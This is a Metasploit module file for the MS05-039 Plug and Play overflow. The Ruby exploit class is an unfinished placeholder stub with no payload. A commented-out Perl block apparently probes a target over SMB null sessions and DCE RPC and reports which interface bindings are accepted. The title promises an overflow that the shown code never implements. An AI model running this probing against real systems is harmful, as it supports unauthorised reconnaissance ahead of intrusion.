require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft PnP MS05-039 Overflow',
			'Description'    => %q{
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '18605'],
					[ 'CVE', '2005-1983'],
					[ 'BID', '14513'],
					[ 'MSB', 'MS05-039'],
					[ 'URL', 'http://www.hsc.fr/ressources/presentations/null_sessions/'],
					[ 'MIL', '87'],

				],
			'Privileged'     => true,
			
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 9 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::brutebind;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::x86;

my $advanced =
  {
	'FragSize'  => [256, 'The application fragment size to use with DCE RPC'],
	'DirectSMB' => [0,    'Use the direct SMB protocol (445/tcp) instead of SMB over NetBIOS'],
  };

my $info =
  {
	'Name'  => 'Microsoft PnP MS05-039 Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target port', 139],
		'BINDFILE' => [1, 'DATA', 'Filename with binds' ],

		# Optional pipe name
		'SMBPIPE' => [1, 'DATA', 'Pipe name: browser, srvsvc, wkssvc', 'browser'],

		# SMB connection options
		'SMBUSER' => [0, 'DATA', 'The SMB username to connect with', ''],
		'SMBPASS' => [0, 'DATA', 'The password for specified SMB username', ''],
		'SMBDOM'  => [0, 'DATA', 'The domain for specified SMB username', ''],
	  },

	'Description'  => Pex::Text::Freeform(qq{
}),

	'Refs'  =>
	  [
		['OSVDB', '18605'],
		['CVE', '2005-1983'],
		['BID', '14513'],
		['MSB', 'MS05-039'],
		['URL', 'http://www.hsc.fr/ressources/presentations/null_sessions/'],
		['MIL', '87'],
	  ],

	'Keys'  =>  ['pnp'],

	'DisclosureDate' => 'Aug 9 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $fragSize    = $self->GetVar('FragSize') || 256;
	my $filename    = $self->GetVar('BINDFILE');
	my $target_name = '*SMBSERVER';

	open(INFILE, "<$filename") or return;

	my $bindlist = [ ];

	while(my $line = <INFILE>) {
		chomp($line);

		push(@{$bindlist}, [ split(' ', $line, 3) ]);
	}

	foreach my $bindz (@{$bindlist}) {

		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );

		if ($s->IsError) {
			$self->PrintLine("[*] Socket error: " . $s->GetError());
			return(0);
		}

		my $x = Pex::SMB->new({ 'Socket' => $s });

		if ($target_port != 445 && ! $self->GetVar('DirectSMB')) {
			$x->SMBSessionRequest($target_name);
			if ($x->Error) {
				$self->PrintLine("[*] Session request failed for $target_name");
				return;
			}
		}

		$x->SMBNegotiate();
		$x->SMBSessionSetup (
			$self->GetVar('SMBUSER'),
			$self->GetVar('SMBPASS'),
			$self->GetVar('SMBDOM')
		  );

		if ($x->Error) {
			$self->PrintLine("[*] Failed to establish a null session");
			return;
		}

		$x->SMBTConnect("\\\\".$target_name."\\IPC\$");
		if ($x->Error) {
			$self->PrintLine("[*] Failed to connect to the IPC share");
			return;
		}

		my ($bind, $ctx);


		my $bin = Pex::DCERPC::UUID_to_Bin($bindz->[0]);
		($bind, $ctx) = Pex::DCERPC::BindFakeMulti(
		  $bin,
		  $bindz->[1], 0, 0
		);

		$x->SMBCreate('\\'. $self->GetVar('SMBPIPE'));
		if ($x->Error) {
			$self->PrintLine("[*] Failed to create pipe to NTSVCS");
			return;
		}

		my $res = $x->SMBTransNP($x->LastFileID, $bind);
		if ($x->Error) {
			$self->PrintLine("[*] Failed to bind to NTSVCS over DCE RPC: ".$x->Error);
			return;
		}

		if(index($res->Get('data_bytes'), "\x04\x5d\x88\x8a") == -1) {
			$s->Close;
			next;
		}
		
		my $axs = 'Unknown';
		
		my ($req) = Pex::DCERPC::Request(255, ("X" x 32), 1024, $ctx);
		$res = $x->SMBTransNP($x->LastFileID, $req);
		if ($res) {
			my $dce = Pex::DCERPC::DecodeResponse($res->Get('data_bytes'));
			if ($dce->{'Status'} == 5) {
				$axs = 'Denied';
			} else { 
				$axs = 'Accepted';
			}
		}
		
		$self->PrintLine('[*] Bound to '.join(' ', @{$bindz}). " ($axs)");
		$s->Close;
	}


	return;
}


1;

=end


end
end	
